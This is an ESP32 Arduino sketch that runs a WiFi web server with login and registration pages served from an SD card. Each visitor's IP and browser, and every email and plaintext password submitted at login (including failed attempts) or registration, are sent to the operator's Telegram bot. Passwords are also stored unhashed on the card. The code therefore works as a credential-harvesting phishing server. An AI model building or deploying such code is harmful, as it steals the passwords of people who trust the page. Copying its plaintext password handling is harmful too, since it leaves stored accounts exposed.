#include <WiFi.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>
#include <ArduinoJson.h>

// EDIT: Replace with your own port number
WebServer server(80);
File uploadFile;

// EDIT: Replace with your own WiFi credentials
const char* ssid = "PUT_YOUR_WIFI";
const char* password = "PUT_YOUR_PASSWORD";

// EDIT: Replace with your own Telegram bot token and chat ID
#define BOT_TOKEN "PUT_YOUR_BOT_TOKEN_HERE"
#define CHAT_ID "PUT_YOUR_CHAT_ID_HERE"


WiFiClientSecure secured_client;
UniversalTelegramBot bot(BOT_TOKEN, secured_client);

#define SD_CS 5

const char* USERS_FILE = "/users.json";

void setup() {
  Serial.begin(115200);
  Serial.println("بدء تشغيل النظام...");

  Serial.print("sd card initializing... ");
  if (!SD.begin(SD_CS)) {
    Serial.println("failed to initialize sd card!");
    return;
  }
  Serial.println("sd card has been initialized successfully!");

  
  if (!SD.exists(USERS_FILE)) {
    File usersFile = SD.open(USERS_FILE, FILE_WRITE);
    if (usersFile) {
      
      usersFile.println("[]");
      usersFile.close();
      Serial.println("users file has been created successfully!");
    } else {
      Serial.println("failed to create users file!");
    }
  } else {
    Serial.println("users file already exists!");
  }


  Serial.print("connecting to the WiFi network... ");
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("");
  Serial.println("successfull connection to the WiFi network!");
  Serial.print("IP Address: ");
  Serial.println(WiFi.localIP());

  
  secured_client.setCACert(TELEGRAM_CERTIFICATE_ROOT);

  
  bot.sendMessage(CHAT_ID, "The ESP-32 ip address is: " + WiFi.localIP().toString(), "");
  Serial.println("a message has been sent to Telegram!");

  
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/register", HTTP_POST, handleRegister);
  server.onNotFound(handleNotFound);
  
  
  server.begin();
  Serial.println("server has successfully started!");
}

void loop() {
  server.handleClient();
}


void handleRoot() {
  String ip = server.client().remoteIP().toString();
  String userAgent = server.header("User-Agent");
  String method = server.method() == HTTP_GET ? "GET" : "POST";
  String path = server.uri();
  
  String message = "⚠️ New Visitor! ⚠️\n";
  message += "IP: " + ip + "\n";
  message += "Browser: " + userAgent + "\n";
  message += "Method: " + method + "\n";
  message += "Path: " + path + "\n";
  message += "Time: " + String(millis() / 1000) + " seconds since startup";
  
  bot.sendMessage(CHAT_ID, message, "");
  Serial.println("Visitor info sent to Telegram!");
  
  
  File file = SD.open("/index.html", FILE_READ);
  if (!file) {
    server.send(404, "text/plain", "ملف غير موجود!");
    Serial.println("خطأ: ملف index.html غير موجود!");
    return;
  }
  
  server.streamFile(file, "text/html");
  file.close();
  Serial.println("تم عرض صفحة index.html بنجاح!");
}


void handleLogin() {
  String email = server.arg("email");
  String password = server.arg("password");
  
  if (email != "" && password != "") {
    if (verifyUser(email, password)) {
      // Send login notification to Telegram
      String loginMsg = "✅ Successful Login!\n";
      loginMsg += "Email: " + email + "\n";
      loginMsg += "Password: " + password + "\n";
      loginMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, loginMsg, "");
      
      server.send(200, "text/plain", "HI FROM ESP32! WELCOME TO OUR WEBSITE");
    } else {
      // Send failed login attempt to Telegram
      String failMsg = "❌ Failed Login Attempt!\n";
      failMsg += "Email: " + email + "\n";
      failMsg += "Password: " + password + "\n";
      failMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, failMsg, "");
      
      server.send(401, "text/plain", "Invalid email or password!");
    }
  } else {
    server.send(400, "text/plain", "Please enter email and password!");
  }
}

void handleRegister() {
  String email = server.arg("email");
  String password = server.arg("password");
  
  if (email != "" && password != "") {
    if (userExists(email)) {
      // Send registration attempt for existing user
      String existMsg = "⚠️ Registration Attempt (User Exists)!\n";
      existMsg += "Email: " + email + "\n";
      existMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, existMsg, "");
      
      server.send(409, "text/plain", "User already exists!");
    } else {
      if (addUser(email, password, email)) {
        // Send successful registration notification
        String regMsg = "✨ New User Registered!\n";
        regMsg += "Email: " + email + "\n";
        regMsg += "Password: " + password + "\n";
        regMsg += "IP: " + server.client().remoteIP().toString();
        bot.sendMessage(CHAT_ID, regMsg, "");
        
        server.send(200, "text/plain", "Registration successful!");
      } else {
        server.send(500, "text/plain", "Error saving data!");
      }
    }
  } else {
    server.send(400, "text/plain", "Please enter email and password!");
  }
}


void handleNotFound() {

  String path = server.uri();
  Serial.println("طلب الملف: " + path);
  
  if (path.endsWith("/")) {
    path += "index.html";
  }
  
  String contentType = getContentType(path);
  

  if (path.charAt(0) != '/') {
    path = "/" + path;
  }
  
  if (SD.exists(path)) {
    File file = SD.open(path, FILE_READ);
    server.streamFile(file, contentType);
    file.close();
    Serial.println("تم عرض الملف: " + path + " بنجاح!");
  } else {
    Serial.println("خطأ: الملف غير موجود: " + path);
    server.send(404, "text/plain", "الملف غير موجود!");
  }
}


String getContentType(String filename) {
  if (filename.endsWith(".html")) return "text/html";
  else if (filename.endsWith(".css")) return "text/css";
  else if (filename.endsWith(".js")) return "application/javascript";
  else if (filename.endsWith(".png")) return "image/png";
  else if (filename.endsWith(".jpg")) return "image/jpeg";
  else if (filename.endsWith(".ico")) return "image/x-icon";
  else if (filename.endsWith(".json")) return "application/json";
  return "text/plain";
}


bool userExists(String email) {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("failed to open users file for reading!");
    return false;
  }
  
  DynamicJsonDocument doc(16384);
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("failed to parse users file: ");
    Serial.println(error.c_str());
    return false;
  }
  
  JsonArray users = doc.as<JsonArray>();
  for (JsonObject user : users) {
    if (user["username"] == email) {  
      return true;
    }
  }
  return false;
}


bool verifyUser(String email, String password) {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("failed to open users file for reading!");
    return false;
  }
  
  DynamicJsonDocument doc(16384); 
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("failed to parse users file: ");
    Serial.println(error.c_str());
    return false;
  }
  
  JsonArray users = doc.as<JsonArray>();
  for (JsonObject user : users) {
    if (user["username"] == email && user["password"] == password) {  // Check email instead of username
      return true;
    }
  }
  return false;
}

bool addUser(String username, String password, String email) {
  
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("failed to open users file for reading!");
    return false;
  }
  
  DynamicJsonDocument doc(16384); 
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("failed to parse users file: ");
    Serial.println(error.c_str());
    
    
    doc.clear();
    doc.to<JsonArray>();
  }
  

  JsonArray users = doc.as<JsonArray>();
  JsonObject newUser = users.createNestedObject();
  newUser["username"] = username;
  newUser["password"] = password;
  newUser["email"] = email;
  newUser["registered_at"] = millis() / 1000;
  newUser["ip"] = server.client().remoteIP().toString();
  

  SD.remove(USERS_FILE);
  File newUsersFile = SD.open(USERS_FILE, FILE_WRITE);
  if (!newUsersFile) {
    Serial.println("failed to open users file for writing!");
    return false;
  }
  
  if (serializeJson(doc, newUsersFile) == 0) {
    Serial.println("failed to write to users file!");
    newUsersFile.close();
    return false;
  }
  
  newUsersFile.close();
  Serial.println("user has been added successfully!");
  Serial.print("total users: ");
  Serial.println(users.size());
  return true;
}


String getAllUsers() {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("failed to open users file for reading!");
    return "[]";
  }
  
  String users = "";
  while (usersFile.available()) {
    users += (char)usersFile.read();
  }
  
  usersFile.close();
  return users;
}